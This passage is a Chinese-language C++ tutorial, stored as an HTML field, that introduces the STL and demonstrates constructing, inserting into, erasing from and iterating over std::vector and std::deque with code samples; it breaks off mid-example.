            "content_html": "<h1 id=\"stl\"><a class=\"anchor\" href=\"#stl\">#</a> STL</h1>\n<p>C++ 进阶学习 STL。</p>\n<h2 id=\"stl-概述\"><a class=\"anchor\" href=\"#stl-概述\">#</a> STL 概述</h2>\n<h3 id=\"什么是stl\"><a class=\"anchor\" href=\"#什么是stl\">#</a> 什么是 STL</h3>\n<p>STL（Standard Template Library ），即标准模板库，是一个具有工业强度的，高效的 C++ 程序库；它被容纳于 C++ 标准程序库（ C++ Standard Library ）中，是 ANSI/ISO C++ 标准中最新的也是极具革命性的一部分；该库包含了诸多在计算机科学领域里所常用的基本数据结构和基本算法，为广大 C++ 程序员们提供了一个可扩展的应用框架， 高度体现了软件的可复用性。</p>\n<p>STL 是最新的 C++ 标准函数库中的一个子集，这个庞大的子集占据了整个库的大约 80% 的份量。</p>\n<h3 id=\"stl基本组件\"><a class=\"anchor\" href=\"#stl基本组件\">#</a> STL 基本组件</h3>\n<p>STL 主要由容器，迭代器和算法组成。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p><strong>容器：</strong> 可容纳各种数据类型的数据结构；</p>\n<p><strong>迭代器：</strong> 可依次存取容器中元素的东西；</p>\n<p><strong>算法：</strong> 用来操作容器中的元素的函数模版。例如，STL 用 sort () 来对一个 vector 中的数据进行排序。</p>\n<p>举例说明：数组  <code>int array[100]</code>  就是一个容器，而 <code>int*</code>  类型的指针就可以作为迭代器，可以为这个容器编写一个排序算法。</p>\n<h2 id=\"vector容器\"><a class=\"anchor\" href=\"#vector容器\">#</a> Vector 容器</h2>\n<h3 id=\"什么是vector容器\"><a class=\"anchor\" href=\"#什么是vector容器\">#</a> 什么是 Vector 容器</h3>\n<p>Vector（向量）是一个封装了动态大小数组的顺序容器；跟任意其它类型容器一样，它能够存放各种类型的对象；Vector 是用动态数组来实现的。</p>\n<p>在使用 Vector 的时候需要包含头文件和使用命名空间：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;vector></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>Vector 支持随机存取，它有大小（size）和容量（capacity）两个属性，大小（size）就是实际元素的个数，容量（capacity）表示能容纳元素最大的数量，如果插入元素时，元素个数超过容量大小，则需要重新配置内部存储器。</p>\n<h3 id=\"使用vector容器\"><a class=\"anchor\" href=\"#使用vector容器\">#</a> 使用 Vector 容器</h3>\n<h4 id=\"构造容器\"><a class=\"anchor\" href=\"#构造容器\">#</a> 构造容器</h4>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 构造容器</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span>\t\t\t\t<span class=\"token comment\">// 空的容器，里面没有元素</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v2</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 100 个容器，默认数据都为 0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v3</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 100 个值为 8 的元素</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v4</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t\t<span class=\"token comment\">// 100 个值为 8 的元素</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">int</span> nTmpAry<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span><span class=\"token number\">21</span><span class=\"token punctuation\">,</span><span class=\"token number\">22</span><span class=\"token punctuation\">,</span><span class=\"token number\">23</span><span class=\"token punctuation\">,</span><span class=\"token number\">24</span><span class=\"token punctuation\">,</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token number\">26</span><span class=\"token punctuation\">,</span><span class=\"token number\">27</span><span class=\"token punctuation\">,</span><span class=\"token number\">28</span><span class=\"token punctuation\">,</span><span class=\"token number\">29</span><span class=\"token punctuation\">,</span><span class=\"token number\">30</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v5</span><span class=\"token punctuation\">(</span>nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 从 nTmpAry 数组中索引为 1 开始，到到数组索引为 5 为止，复制这个区间内数组的元素到容器中</span></pre></td></tr></table></figure><h4 id=\"添加元素\"><a class=\"anchor\" href=\"#添加元素\">#</a> 添加元素</h4>\n<p>Vector 添加元素的函数有：<br />\n <code>push_back()</code>  ： 每次都添加到了容器的尾部<br />\n <code>insert()</code>  ：添加到指定位置</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 添加元素</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 每次都添加到了容器的尾部</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// 添加到指定位置、</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">// 在容器首部添加一个值为 99 的元素</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">// 在容器第 3 个位置处插入 2 个 98</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token comment\">// 在容器首部添加数组 nTmpAry 索引为 6 到 9 区间内的元素到容器中</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"删除元素\"><a class=\"anchor\" href=\"#删除元素\">#</a> 删除元素</h4>\n<p>Vector 删除元素的函数有：<br />\n <code>pop_back()</code>  ： 删除尾部元素。<br />\n <code>erase()</code>  : 删除指定位置的元素，也可删除多个元素。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 删除元素</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 删除尾部元素</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>v1<span class=\"token punctuation\">.</span><span class=\"token function\">pop_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============pop_back删除=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// 删除指定位置的元素</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>v1<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============erase删除=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// 迭代器遍历</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator nIt <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>nIt <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>nIt<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">// 删除多个元素，删除指定区间的元素</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>v1<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============erase删除2=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"deque容器\"><a class=\"anchor\" href=\"#deque容器\">#</a> Deque 容器</h2>\n<h3 id=\"什么是deque容器\"><a class=\"anchor\" href=\"#什么是deque容器\">#</a> 什么是 Deque 容器</h3>\n<p>1.Deque 是 Double-Ended Queue 的缩写，是在首尾两端增删元素具有较佳性能的容器；</p>\n<p>2.Deque 容器与 Vector 容器相似都是模拟动态数组，它们都是顺序容器，所有适用于 Vector 的操作都适用于 Deque；</p>\n<p>3.Deque 还有  <code>push_front</code>  函数 (将元素插入到前面) 和  <code>pop_front</code>  函数 (删除最前面的元素) 操作（Vector 容器只有在尾部操作的方法，因此 Vector 适用于尾部的操作）。</p>\n<h3 id=\"使用deque容器\"><a class=\"anchor\" href=\"#使用deque容器\">#</a> 使用 Deque 容器</h3>\n<p>首先需要包含头文件和使用命名空间：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;deque></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>由于在 Deque 容器中适用所有 Vector 的操作，这里不过多赘述</p>\n<p>下面附上以  <code>deque</code>  来实现上面  <code>vector</code>  的操作</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 构造容器</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tdeque<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span>\t\t\t\t<span class=\"token comment\">// 空的容器，里面没有元素</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tdeque<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v2</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 100 个容器，默认数据都为 0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tdeque<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v3</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 100 个值为 8 的元素</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tdeque<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v4</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t\t<span class=\"token comment\">// 100 个值为 8 的元素</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">int</span> nTmpAry<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span><span class=\"token number\">21</span><span class=\"token punctuation\">,</span><span class=\"token number\">22</span><span class=\"token punctuation\">,</span><span class=\"token number\">23</span><span class=\"token punctuation\">,</span><span class=\"token number\">24</span><span class=\"token punctuation\">,</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token number\">26</span><span class=\"token punctuation\">,</span><span class=\"token number\">27</span><span class=\"token punctuation\">,</span><span class=\"token number\">28</span><span class=\"token punctuation\">,</span><span class=\"token number\">29</span><span class=\"token punctuation\">,</span><span class=\"token number\">30</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tdeque<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v5</span><span class=\"token punctuation\">(</span>nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 从 nTmpAry 数组中索引为 1 开始，到数组索引为 5，复制这个区间内数组的元素到容器中</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">// 添加元素</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 每次都添加到了容器的尾部</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token comment\">// 添加到指定位置、</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token comment\">// 在容器首部添加一个值为 99 的元素</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token comment\">// 在容器第 3 个位置处插入 2 个 98</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token comment\">// 在容器首部添加数组 nTmpAry 索引为 6 到 9 区间内的元素到容器中</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"====================v1的地址为：%p\\r\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token comment\">// 删除元素</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token comment\">// 删除尾部元素</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">pop_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============pop_back删除=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">at</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token comment\">// 删除指定位置的元素</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token 